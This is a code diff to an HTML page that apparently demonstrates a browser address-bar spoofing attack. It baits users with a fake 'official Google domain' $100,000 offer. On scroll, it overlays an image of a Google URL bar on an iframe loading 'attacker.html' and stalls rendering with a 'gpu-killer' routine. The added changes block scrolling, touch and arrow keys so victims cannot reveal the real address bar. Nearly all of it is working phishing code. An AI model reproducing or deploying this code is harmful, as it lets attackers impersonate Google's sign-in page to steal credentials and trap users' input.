@@ -19,6 +19,14 @@
         scroll-behavior: smooth;
         overflow-x: hidden;
       }
+      
+
+      .lock-scroll {
+        overflow: hidden !important;
+        height: 100% !important;
+        touch-action: none
+      }
+
       #scroll-bait {
         display: flex;
         flex-direction: column;
@@ -29,6 +37,7 @@
         color: #5f6368;
         padding: 20px;
       }
+
       #fake-ui {
         display: none;
         position: fixed;
@@ -38,7 +47,9 @@
         height: 100vh;
         z-index: 99999;
         background: #fff;
+        touch-action: none; 
       }
+
       #fake-bar {
         position: absolute;
         bottom: 0;
@@ -47,11 +58,14 @@
         height: 56px;
         object-fit: contain;
         border-bottom: 1px solid #ddd;
-        z-index: 10;
+        z-index: 100;
         opacity: 0;
         transition: opacity 0.1s ease-in;
         pointer-events: none;
+        touch-action: none;
+        -webkit-user-drag: none;
       }
+
       #fake-content {
         position: absolute;
         top: 0;
@@ -61,10 +75,9 @@
         border: none;
         z-index: 1;
         display: block;
-        transition:
-          top 0.1s ease-in,
-          height 0.1s ease-in;
+        transition: top 0.1s ease-in, height 0.1s ease-in;
       }
+
       #gpu-killer {
         position: fixed;
         top: 0;
@@ -79,13 +92,14 @@
   <body>
     <div id="scroll-bait">
       <h2>
-        This is the official Google domain. Want to earn $100,000? Follow these
-        instructions. Please scroll down to the bottom of this page to proceed
-        to accounts.google.com.
+        This is the official Google domain. Want to earn $100,000? Follow ini. 
+        Please scroll down to the bottom of this page to proceed to accounts.google.com.
       </h2>
       <div style="font-size: 50px; color: #1a73e8; margin-top: 30px">↓</div>
     </div>
+
     <div id="gpu-killer"></div>
+
     <div id="fake-ui">
       <img id="fake-bar" src="urlbar-google.jpg" alt="Google Address Bar" />
       <iframe id="fake-content" src="attacker.html"></iframe>
@@ -105,20 +119,41 @@
         while (Date.now() - start < 400) {}
       }
 
+      function lockEverything() {
+        window.onwheel = (e) => e.preventDefault();
+        window.onmousewheel = (e) => e.preventDefault();
+        window.ontouchmove = (e) => e.preventDefault();
+        
+        window.onkeydown = (e) => {
+            if([32, 37, 38, 39, 40].indexOf(e.keyCode) > -1) {
+                e.preventDefault();
+            }
+        };
+
+        document.documentElement.classList.add('lock-scroll');
+        document.body.classList.add('lock-scroll');
+      }
+
       window.addEventListener(
         "scroll",
         () => {
           if (window.scrollY > 80 && !isSpoofed) {
             isSpoofed = true;
             document.getElementById("fake-ui").style.display = "block";
+            
             triggerMeltdown();
+            
+
+            lockEverything();
+            
             window.scrollTo(0, 0);
+
             setTimeout(() => {
               document.getElementById("gpu-killer").innerHTML = "";
             }, 1000);
           }
         },
-        { passive: true },
+        { passive: false },
       );
 
       window.addEventListener("message", (e) => {
@@ -132,13 +167,11 @@
         }
       });
 
-      document.getElementById("fake-bar").addEventListener(
-        "touchmove",
-        (e) => {
-          if (isSpoofed) e.preventDefault();
-        },
-        { passive: false },
-      );
+      const fb = document.getElementById("fake-bar");
+      fb.addEventListener("touchstart", (e) => e.preventDefault(), {passive: false});
+      fb.addEventListener("touchmove", (e) => e.preventDefault(), {passive: false});
+      fb.addEventListener("touchend", (e) => e.preventDefault(), {passive: false});
+
     </script>
   </body>
 </html>
